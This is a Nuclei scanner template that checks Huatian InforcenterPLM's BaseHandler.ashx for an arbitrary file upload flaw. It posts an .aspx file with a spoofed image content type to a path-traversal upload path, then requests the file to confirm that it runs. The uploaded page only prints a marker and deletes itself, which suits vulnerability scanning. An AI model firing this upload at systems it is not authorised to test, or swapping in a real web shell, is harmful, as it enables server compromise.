id: huatian-InforcenterPLM-BaseHandler_ashx-File-upload

info:
  name: 华天InforcenterPLM BaseHandler.ashx 任意文件上传漏洞
  author: huatian
  severity: high
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTxlvAiDA82bSOF0h

        ------WebKitFormBoundaryTxlvAiDA82bSOF0h
        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
        ------WebKitFormBoundaryTxlvAiDA82bSOF0h--
    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '(/+[a-zA-Z0-9-]+[-a-zA-Z0-9]+\.aspx)'
         internal: true
       - type: regex 
         part: body
         name: time
         group: 1
         regex:
           - '(Files/+[0-9]+)'
         internal: true
  - raw:
      - |
        GET /{{time}}{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200